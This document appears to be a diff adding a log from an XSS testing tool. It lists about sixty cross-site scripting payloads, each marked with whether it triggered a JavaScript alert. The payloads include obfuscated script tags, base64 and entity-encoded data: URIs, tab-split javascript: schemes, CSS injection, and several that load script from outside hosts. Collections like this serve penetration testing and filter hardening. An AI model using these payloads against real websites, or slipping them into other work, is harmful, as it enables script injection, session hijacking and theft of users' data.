@@ -1,0 +1,61 @@
+Payload: helloworld | Alert: False
+Payload: %253Cscript%253Ealert('XSS')%253C%252Fscript%253E | Alert: False
+Payload: <INPUT TYPE="BUTTON" action="alert('XSS')"/> | Alert: False
+Payload: "><h1><iframe width="420" height="315" src="http://www.youtube.com/embed/sxvccpasgTE" frameborder="0" allowfullscreen></iframe>123</h1> | Alert: False
+Payload: g'"></IFRAME>Hover the cursor to the LEFT of this Message</h1>&ParamHeight=250 | Alert: False
+Payload: <iframe src=http://xss.rocks/scriptlet.html < | Alert: False
+Payload: <img src=``&NewLine; onerror=alert(1)&NewLine; | Alert: False
+Payload: <script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script> | Alert: False
+Payload: <ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=? | Alert: True
+Payload: <iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg=="> | Alert: False
+Payload: <script /**/>/**/alert(1)/**/</script /**/ | Alert: True
+Payload: <iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>"> | Alert: True
+Payload: <svg><script xlink:href=data&colon;,window.open('https://www.google.com/') </script | Alert: False
+Payload: <svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera} | Alert: False
+Payload: <a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a | Alert: False
+Payload: <script ^__^>alert(String.fromCharCode(49))</script ^__^ | Alert: True
+Payload: <script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/ | Alert: True
+Payload: <iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'> | Alert: True
+Payload: <script ~~~>alert(0%0)</script ~~~> | Alert: True
+Payload: <style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;> | Alert: True
+Payload: &#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>' | Alert: True
+Payload: <div/style="width:expression(confirm(1))">X</div> {IE7} | Alert: False
+Payload: //|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\ | Alert: False
+Payload: </svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera} | Alert: False
+Payload: <embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"> | Alert: False
+Payload: <object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"> | Alert: False
+Payload: <%<!--'%><script>alert(1);</script --> | Alert: False
+Payload: <script src="data:text/javascript,alert(1)"></script> | Alert: True
+Payload: <iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe> | Alert: False
+Payload: <svg><script ?>alert(1) | Alert: False
+Payload: <iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe> | Alert: True
+Payload: <img src=`xx:xx`onerror=alert(1)> | Alert: False
+Payload: <object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object> | Alert: True
+Payload: <math><a xlink:href="//jsfiddle.net/t846h/">click | Alert: False
+Payload: <embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always> | Alert: False
+Payload: <a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a | Alert: False
+Payload: <script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F | Alert: True
+Payload: <script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script | Alert: True
+Payload: <body/onload=&lt;!--&gt;&#10alert(1)> | Alert: True
+Payload: <script itworksinallbrowsers>/*<script* */alert(1)</script | Alert: False
+Payload: <svg><script>//&NewLine;confirm(1);</script </svg> | Alert: True
+Payload: <svg><script onlypossibleinopera:-)> alert(1) | Alert: False
+Payload: <script x> alert(1) </script 1=2 | Alert: True
+Payload: <script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script> | Alert: True
+Payload: <math><a xlink:href="//jsfiddle.net/t846h/">click | Alert: False
+Payload: <object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object> | Alert: True
+Payload: <iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe> | Alert: True
+Payload: <a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a> | Alert: False
+Payload: <object data="data:text/html;base64,%(base64)s"> | Alert: False
+Payload: <embed src="data:text/html;base64,%(base64)s"> | Alert: False
+Payload: <img[a][b][c]src[d]=x[e]onerror=[f]"alert(1)"> | Alert: False
+Payload: <script src="/\%(jscript)s"></script> | Alert: False
+Payload: <script src="\\%(jscript)s"></script> | Alert: False
+Payload: <style>*[{}@import'%(css)s?]</style>X | Alert: False
+Payload: <div style="font-family:'foo&#10;;color:red;';">XXX | Alert: False
+Payload: <div style="font-family:foo}color=red;">XXX | Alert: False
+Payload: <div style=content:url(%(svg)s)></div> | Alert: False
+Payload: <div style="background:url(/f#&#127;oo/;color:red/*/foo.jpg);">X | Alert: False
+Payload: <div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X | Alert: False
+Payload: <div id="x">XXX</div> <style>  #x{font-family:foo[bar;color:green;}  #y];color:red;{}  </style> | Alert: False
+Payload: <x style="background:url('x&#1;;color:red;/*')">XXX</x> | Alert: False
